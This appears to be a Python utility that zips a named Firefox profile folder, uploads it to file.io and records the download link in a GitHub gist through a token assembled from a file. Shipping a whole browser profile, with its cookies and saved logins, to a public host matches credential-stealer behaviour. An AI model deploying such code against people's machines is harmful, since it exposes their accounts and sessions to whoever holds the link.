import os
import zipfile
import requests

# Read the GitHub token from code.txt
with open('code.txt', 'r') as f:
    token_suffix = f.read().strip()

# Complete GitHub token by appending the suffix read from the file
GITHUB_TOKEN = 'ghp_' + token_suffix
GIST_ID = '4d2dae19f71b99b6c38f19d7ef1cdc94'  # Your Gist ID

def get_profile_path(profile_name):
    """Finds the profile folder using the profile name."""
    profiles_dir = os.path.expanduser('~/.mozilla/firefox')
    profile_folders = [f for f in os.listdir(profiles_dir) if f.endswith(profile_name)]
    if profile_folders:
        return os.path.join(profiles_dir, profile_folders[0])
    return None

def zip_folder(folder_path, zip_name):
    """Zips the folder."""
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    zipf.write(file_path, os.path.relpath(file_path, folder_path))
                except FileNotFoundError:
                    print(f"File not found and skipped: {file_path}")
    print(f'Folder zipped successfully as {zip_name}')

def upload_file_to_fileio(file_path):
    """Uploads a file to file.io and returns the download link."""
    url = 'https://file.io?filename=' + os.path.basename(file_path)
    with open(file_path, 'rb') as file:
        files = {'file': file}
        response = requests.post(url, files=files)
        if response.status_code == 200:
            data = response.json()
            if data['success']:
                download_link = f"{data['link']}[\"{os.path.basename(file_path)}\"]"
                print(f'File uploaded successfully! Download link: {download_link}')
                return download_link
            else:
                print('Failed to upload file. Status:', data['status'])
        else:
            print('Error:', response.status_code, response.text)
    return None

def update_gist(download_link):
    """Updates the existing Gist with the new download link."""
    url = f'https://api.github.com/gists/{GIST_ID}'
    headers = {
        'Authorization': f'token {GITHUB_TOKEN}',
        'Accept': 'application/vnd.github.v3+json'
    }
    
    # Fetch the existing Gist content
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        gist_data = response.json()
        existing_content = gist_data['files']['download_links.txt']['content']
        
        # Update content with the new download link
        updated_content = existing_content + f"\n{download_link}"
        
        # Update the Gist with new content
        data = {
            'files': {
                'download_links.txt': {
                    'content': updated_content
                }
            }
        }
        
        response = requests.patch(url, headers=headers, json=data)
        if response.status_code == 200:
            print(f'Gist updated successfully with new link: {download_link}')
        else:
            print('Failed to update Gist. Error:', response.status_code, response.text)
    else:
        print('Failed to fetch Gist. Error:', response.status_code, response.text)

if __name__ == '__main__':
    # Read the latest profile name created by the bash script
    with open('current_profile.txt', 'r') as f:
        profile_name = f.read().strip()

    # Find the profile folder
    profile_path = get_profile_path(profile_name)

    if profile_path:
        zip_name = profile_name + '.zip'
        
        # Zip the profile folder
        zip_folder(profile_path, zip_name)
        
        # Upload the zip file to file.io
        download_link = upload_file_to_fileio(zip_name)
        
        if download_link:
            # Update the Gist with the new download link
            update_gist(download_link)
        
        # Remove the zip file after uploading
        os.remove(zip_name)
    else:
        print(f"Profile folder for '{profile_name}' not found.")
